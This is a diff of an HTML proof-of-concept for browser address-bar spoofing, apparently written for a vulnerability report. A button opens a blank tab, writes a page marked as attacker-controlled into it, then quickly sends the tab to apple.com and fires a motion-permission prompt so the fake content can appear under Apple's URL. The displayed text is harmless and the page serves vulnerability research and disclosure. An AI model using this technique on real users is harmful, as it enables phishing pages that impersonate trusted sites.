@@ -2,7 +2,6 @@
 <html lang="en">
   <head>
     <meta charset="utf-8" />
-
     <meta
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
@@ -11,8 +10,8 @@
     <title>Spoofing</title>
 
     <style>
-      body,
-      html {
+      html,
+      body {
         margin: 0;
         padding: 0;
         height: 100%;
@@ -33,197 +32,124 @@
 
         border: none;
         border-radius: 10px;
-
         cursor: pointer;
       }
     </style>
   </head>
 
   <body>
-
-    <button id="startBtn">
-      CLICK HERE
-    </button>
-
+    <button id="startBtn">CLICK HERE</button>
 
     <script>
-
       /*
-       * ==========================================
-       * MOTION PERMISSION
-       * ==========================================
+       * Motion Permission
+       *
+       * Based on the reqMotion() implementation
+       * from the provided PoC.
        */
-
       function reqMotion() {
-
         if (
           typeof DeviceMotionEvent?.requestPermission === "function"
         ) {
-
           DeviceMotionEvent.requestPermission()
-
             .then((res) => {
-
-              console.log(
-                "Motion permission:",
-                res
-              );
-
+              console.log("Motion permission:", res);
             })
-
             .catch((err) => {
-
               console.log(
-                "Motion permission error:",
+                "Motion permission denied/error:",
                 err
               );
-
             });
-
         } else {
-
-          console.log(
-            "Motion API not supported"
-          );
-
+          console.log("Motion API not supported");
         }
-
       }
 
+      document.getElementById("startBtn").onclick = function () {
+        /*
+         * Remove the original button.
+         */
+        this.remove();
 
-      /*
-       * ==========================================
-       * MAIN BUTTON
-       * ==========================================
-       */
+        /*
+         * Open a new tab containing attacker-controlled content.
+         */
+        const newTab = window.open("about:blank", "_blank");
 
-      document
-        .getElementById("startBtn")
-        .onclick = function () {
+        if (newTab) {
+          newTab.document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+              <meta charset="UTF-8">
+              <title>testertester</title>
+            </head>
 
-          this.remove();
+            <body
+              style="
+                margin:0;
+                padding:0;
+                background:#fff;
+                display:flex;
+                align-items:center;
+                justify-content:center;
+                min-height:100vh;
+                text-align:center;
+              "
+            >
+              <div>
 
+                <h1
+                  style="
+                    font-size:96px;
+                    font-weight:bold;
+                    color:red;
+                    margin:0 0 30px 0;
+                  "
+                >
+                  THIS IS NOT APPLE.COM!
+                </h1>
 
-          /*
-           * Open new tab
-           */
-
-          const newTab =
-            window.open(
-              "about:blank",
-              "_blank"
-            );
-
-
-          if (newTab) {
-
-            /*
-             * Attacker-controlled content
-             */
-
-            newTab.document.write(`
-
-              <!DOCTYPE html>
-
-              <html>
-
-              <head>
-
-                <title>
-                  testertester
-                </title>
-
-              </head>
-
-
-              <body
-                style="
-                  margin:0;
-                  padding:0;
-                  background:#fff;
-
-                  display:flex;
-
-                  align-items:center;
-                  justify-content:center;
-
-                  min-height:100vh;
-
-                  text-align:center;
-                "
-              >
-
-                <div>
-
-                  <h1
+                <i>
+                  <p
                     style="
-                      font-size:96px;
+                      font-size:64px;
                       font-weight:bold;
-                      color:red;
-
-                      margin:0 0 30px 0;
+                      color:#007aff;
+                      margin:20px 0;
                     "
                   >
-                    THIS IS NOT APPLE.COM!
-                  </h1>
+                    *THIS IS AN ATTACKER CONTROLLED PAGE
+                  </p>
+                </i>
 
+              </div>
+            </body>
+            </html>
+          `);
 
-                  <i>
-
-                    <p
-                      style="
-                        font-size:64px;
-                        font-weight:bold;
-                        color:#007aff;
-
-                        margin:20px 0;
-                      "
-                    >
-                      *THIS IS AN ATTACKER CONTROLLED PAGE
-                    </p>
-
-                  </i>
-
-                </div>
-
-              </body>
-
-              </html>
-
-            `);
-
-
-            newTab.document.close();
-
-
-            /*
-             * Navigation
-             */
-
-            setTimeout(() => {
-
-              newTab.location.href =
-                "https://apple.com/";
-
-            }, 1);
-
-          }
-
+          newTab.document.close();
 
           /*
-           * Request motion permission
-           *
-           * IMPORTANT:
-           * Keep this inside the click handler
-           * so the request remains associated
-           * with the user's gesture.
+           * Start navigation to Apple.
            */
+          setTimeout(() => {
+            newTab.location.href = "https://apple.com/";
+          }, 1);
+        }
 
-          reqMotion();
-
-        };
-
+        /*
+         * IMPORTANT:
+         *
+         * reqMotion() is called directly from the click
+         * handler instead of inside another setTimeout().
+         *
+         * This preserves the user-activation context needed
+         * by DeviceMotionEvent.requestPermission().
+         */
+        reqMotion();
+      };
     </script>
-
   </body>
 </html>
